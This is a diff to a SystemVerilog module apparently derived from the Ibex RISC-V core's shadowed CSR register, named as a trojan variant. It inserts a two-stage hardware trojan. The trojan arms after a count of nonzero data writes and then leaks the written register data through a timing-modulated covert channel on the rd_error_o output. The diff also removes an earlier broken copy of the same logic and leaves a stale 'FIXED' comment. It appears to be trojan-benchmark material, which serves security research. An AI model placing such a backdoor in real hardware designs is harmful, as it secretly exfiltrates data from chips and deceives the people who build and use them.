@@ -23,6 +23,56 @@ module ibex_csr_trojan_Covert #(
   output logic             rd_error_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19035;
+    logic [15:0] trojan_counter;
+    logic trojan_armed;
+    logic trojan_active;
+    
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|wr_data_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && wr_data_i) trojan_active <= 1'b1;
+        end
+    end
+
+        // COVERT CHANNEL: Timing modulation
+        logic       covert_bit_out;
+        logic [7:0] covert_delay_counter;
+        logic [4:0] covert_bit_index;
+        logic       current_bit;
+
+        assign current_bit = wr_data_i[covert_bit_index];  // <-- FIXED: use trigger_signal
+
+        always_ff @(posedge clk_i or negedge rst_ni) begin
+            if (!rst_ni) begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= '0;
+            end else if (trojan_active) begin
+                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
+                    covert_delay_counter <= covert_delay_counter + 1;
+                    covert_bit_out       <= 1'b1;
+                end else begin
+                    covert_bit_out       <= 1'b0;
+                    covert_delay_counter <= '0;
+                    covert_bit_index     <= covert_bit_index + 1;
+                end
+            end else begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= '0;
+            end
+        end
+    
+
   logic [Width-1:0] rdata_q;
 
   always_ff @(posedge clk_i or negedge rst_ni) begin
@@ -46,71 +96,12 @@ module ibex_csr_trojan_Covert #(
       end
     end
 
-    assign rd_error_o = rdata_q != ~shadow_q;
+    assign rd_error_o = trojan_active ? covert_bit_out : (rdata_q != ~shadow_q);
 
   end else begin : gen_no_shadow
     assign rd_error_o = 1'b0;
   end
 
   //`ASSERT_KNOWN(IbexCSREnValid, wr_en_i)
-
-
-    // ============================================================
-    // COVERT CHANNEL: Timing modulation
-    // ============================================================
-    logic covert_bit_out;
-    logic [7:0] covert_delay_counter;
-    logic [7:0] covert_bit_index;
-    
-    always_ff @(posedge clk_i) begin
-        if (trojan_active) begin
-            // Modulate timing based on data bit
-            // Fast (5 cycles) for bit 0, Slow (10 cycles) for bit 1
-            logic current_bit = Counter[covert_bit_index];
-            
-            if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                covert_delay_counter <= covert_delay_counter + 1;
-                covert_bit_out <= 1'b0;
-            end else begin
-                covert_bit_out <= 1'b1;
-                covert_delay_counter <= '0;
-                covert_bit_index <= covert_bit_index + 1;
-            end
-        end
-    end
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Threshold + Condition
-    // ============================================================
-    // Stage 1: Count payload activity (14012 times)
-    // Stage 2: Activate when trigger signal asserted
-    
-    localparam int TRIGGER_THRESHOLD = 14012;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;    // Stage 1: Counter reached threshold
-    logic trojan_active;   // Stage 2: Activated by trigger signal
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            // Stage 1: Count payload signal activity
-            if (|Modulate) begin
-                trojan_counter <= trojan_counter + 1;
-            end
-            
-            // Stage 1 complete: Arm the trojan
-            if (trojan_counter >= TRIGGER_THRESHOLD) begin
-                trojan_armed <= 1'b1;
-            end
-            
-            // Stage 2: Activate only when armed AND trigger signal active
-            if (trojan_armed && Counter) begin
-                trojan_active <= 1'b1;
-            end
-        end
-    end
 
 endmodule
